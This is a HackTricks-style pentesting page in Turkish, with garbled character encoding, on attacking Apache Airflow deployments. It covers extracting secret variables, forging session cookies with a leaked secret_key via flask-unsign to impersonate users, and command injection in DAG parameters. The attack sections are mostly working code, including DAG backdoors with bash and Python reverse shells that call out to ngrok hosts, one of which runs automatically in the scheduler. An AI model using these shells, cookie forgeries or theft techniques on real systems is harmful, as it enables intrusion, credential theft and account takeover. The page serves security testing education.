# Apache Airflow GÃ¼venliÄŸi

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

### Temel Bilgiler

[**Apache Airflow**](https://airflow.apache.org), **veri boru hatlarÄ±nÄ± veya iÅŸ akÄ±ÅŸlarÄ±nÄ± dÃ¼zenlemek ve zamanlamak iÃ§in bir platform** olarak hizmet vermektedir. Veri boru hatlarÄ± baÄŸlamÄ±nda "orchestrasyon" terimi, Ã§eÅŸitli kaynaklardan gelen karmaÅŸÄ±k veri iÅŸ akÄ±ÅŸlarÄ±nÄ± dÃ¼zenleme, koordine etme ve yÃ¶netme sÃ¼recini ifade eder. Bu dÃ¼zenlenmiÅŸ veri boru hatlarÄ±nÄ±n temel amacÄ±, iÅŸlenmiÅŸ ve tÃ¼ketilebilir veri setleri saÄŸlamaktÄ±r. Bu veri setleri, iÅŸ zekasÄ± araÃ§larÄ±, veri bilimi ve makine Ã¶ÄŸrenimi modelleri gibi birÃ§ok uygulama tarafÄ±ndan yaygÄ±n olarak kullanÄ±lmaktadÄ±r ve bunlar bÃ¼yÃ¼k veri uygulamalarÄ±nÄ±n iÅŸleyiÅŸi iÃ§in temeldir.

Temelde, Apache Airflow, bir ÅŸey (olay, cron) **gerÃ§ekleÅŸtiÄŸinde kodun Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± zamanlamanÄ±za olanak tanÄ±r**.

### Yerel Laboratuvar

#### Docker-Compose

Tam bir apache airflow docker ortamÄ± baÅŸlatmak iÃ§in [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) adresinden **docker-compose yapÄ±landÄ±rma dosyasÄ±nÄ±** kullanabilirsiniz. (EÄŸer MacOS kullanÄ±yorsanÄ±z, docker VM'ye en az 6GB RAM vermeyi unutmayÄ±n).

#### Minikube

**Apache Airflow'u Ã§alÄ±ÅŸtÄ±rmanÄ±n** kolay bir yolu, **minikube ile Ã§alÄ±ÅŸtÄ±rmaktÄ±r**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
### Airflow YapÄ±landÄ±rmasÄ±

Airflow, yapÄ±landÄ±rmasÄ±nda **hassas bilgileri** saklayabilir veya zayÄ±f yapÄ±landÄ±rmalar bulabilirsiniz:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

### Airflow RBAC

Airflow'a saldÄ±rmaya baÅŸlamadan Ã¶nce **izinlerin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±** anlamalÄ±sÄ±nÄ±z:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

### SaldÄ±rÄ±lar

#### Web Konsolu SayÄ±mÄ±

EÄŸer **web konsoluna eriÅŸiminiz** varsa, aÅŸaÄŸÄ±daki bilgilerden bazÄ±larÄ±na veya hepsine eriÅŸim saÄŸlayabilirsiniz:

* **DeÄŸiÅŸkenler** (Ã–zel hassas bilgiler burada saklanabilir)
* **BaÄŸlantÄ±lar** (Ã–zel hassas bilgiler burada saklanabilir)
* `http://<airflow>/connection/list/` adresinden eriÅŸin
* [**YapÄ±landÄ±rma**](./#airflow-configuration) (Hassas bilgiler, Ã¶rneÄŸin **`secret_key`** ve ÅŸifreler burada saklanabilir)
* **kullanÄ±cÄ±lar & roller** listesini gÃ¶rÃ¼ntÃ¼leyin
* **Her DAG'Ä±n kodu** (ilginÃ§ bilgiler iÃ§erebilir)

#### DeÄŸiÅŸken DeÄŸerlerini Alma

DeÄŸiÅŸkenler Airflow'da saklanabilir, bÃ¶ylece **DAG'lar** deÄŸerlerine **eriÅŸebilir**. Bu, diÄŸer platformlarÄ±n gizli bilgilerine benzer. EÄŸer **yeterli izinleriniz** varsa, bunlara `http://<airflow>/variable/list/` adresinden GUI'de eriÅŸebilirsiniz.\
Airflow varsayÄ±lan olarak deÄŸiÅŸkenin deÄŸerini GUI'de gÃ¶sterir, ancak [**ÅŸuna**](https://marclamberti.com/blog/variables-with-apache-airflow/) gÃ¶re, **deÄŸerleri** **yÄ±ldÄ±zlar** olarak gÃ¶rÃ¼necek ÅŸekilde **deÄŸiÅŸkenler listesi** ayarlamak mÃ¼mkÃ¼ndÃ¼r.

![](<../../.gitbook/assets/image (164).png>)

Ancak, bu **deÄŸerler** hala **CLI** aracÄ±lÄ±ÄŸÄ±yla (DB eriÅŸiminiz olmalÄ±), **rastgele DAG** Ã§alÄ±ÅŸtÄ±rarak, **API** ile deÄŸiÅŸkenler uÃ§ noktasÄ±na eriÅŸerek (API'nin etkinleÅŸtirilmesi gerekir) ve **hatta GUI'nin kendisiyle** **alÄ±nabilir!**\
Bu deÄŸerleri GUI'den eriÅŸmek iÃ§in sadece **eriÅŸmek istediÄŸiniz deÄŸiÅŸkenleri** seÃ§in ve **Eylemler -> DÄ±ÅŸa Aktar** seÃ§eneÄŸine tÄ±klayÄ±n.\
BaÅŸka bir yol, **gizli deÄŸere** ulaÅŸmak iÃ§in **arama filtrelemesi** kullanarak **bruteforce** yapmaktÄ±r:

![](<../../.gitbook/assets/image (152).png>)

#### Yetki YÃ¼kseltme

EÄŸer **`expose_config`** yapÄ±landÄ±rmasÄ± **True** olarak ayarlandÄ±ysa, **KullanÄ±cÄ±** rolÃ¼nden ve **Ã¼zerindeki** roller **web'deki yapÄ±landÄ±rmayÄ±** **okuyabilir**. Bu yapÄ±landÄ±rmada, **`secret_key`** gÃ¶rÃ¼nÃ¼r, bu da geÃ§erli bir kullanÄ±cÄ±ya sahip olan herkesin **kendi imzalÄ± Ã§erezini oluÅŸturup baÅŸka bir kullanÄ±cÄ± hesabÄ±nÄ± taklit edebileceÄŸi** anlamÄ±na gelir.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
#### DAG Arka KapÄ± (Airflow iÅŸÃ§i iÃ§inde RCE)

EÄŸer **DAG'larÄ±n kaydedildiÄŸi** yere **yazma eriÅŸiminiz** varsa, sadece **bir tane oluÅŸturabilirsiniz** ve bu size bir **ters kabuk** gÃ¶nderecektir.\
Bu ters kabuÄŸun bir **airflow iÅŸÃ§i konteyneri** iÃ§inde Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± unutmayÄ±n:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
#### DAG Arka KapÄ± (Airflow zamanlayÄ±cÄ±sÄ±nda RCE)

EÄŸer bir ÅŸeyi **kodun kÃ¶kÃ¼nde Ã§alÄ±ÅŸacak ÅŸekilde ayarlarsanÄ±z**, bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± anda, **zamanlayÄ±cÄ± tarafÄ±ndan** DAG'Ä±n klasÃ¶rÃ¼ne yerleÅŸtirildikten birkaÃ§ saniye sonra **Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r**.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
#### DAG OluÅŸturma

EÄŸer **DAG kÃ¼mesindeki bir makineyi ele geÃ§irirseniz**, `dags/` klasÃ¶rÃ¼nde yeni **DAG scriptleri** oluÅŸturabilirsiniz ve bunlar **DAG kÃ¼mesindeki diÄŸer makinelere kopyalanacaktÄ±r.**

#### DAG Kod Enjeksiyonu

GUI'den bir DAG Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nÄ±zda ona **argÃ¼manlar** **geÃ§ebilirsiniz.**\
Bu nedenle, eÄŸer DAG dÃ¼zgÃ¼n kodlanmamÄ±ÅŸsa **Komut Enjeksiyonuna karÅŸÄ± savunmasÄ±z** olabilir.\
Bu, bu CVE'de olan bir durumdur: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

**DAG'lerde komut enjeksiyonlarÄ± aramaya baÅŸlamak iÃ§in bilmeniz gereken tek ÅŸey**, **parametrelerin** **`dag_run.conf.get("param_name")`** kodu ile **eriÅŸildiÄŸidir.**

AyrÄ±ca, aynÄ± zafiyet **deÄŸiÅŸkenlerle** de meydana gelebilir (yeterli ayrÄ±calÄ±klara sahip olduÄŸunuzda **deÄŸiÅŸkenlerin deÄŸerini GUI'de kontrol edebilirsiniz**). DeÄŸiÅŸkenler **ÅŸu ÅŸekilde eriÅŸilir:**
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
EÄŸer bir bash komutu iÃ§inde kullanÄ±lÄ±rlarsa, bir komut enjeksiyonu gerÃ§ekleÅŸtirebilirsiniz.

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
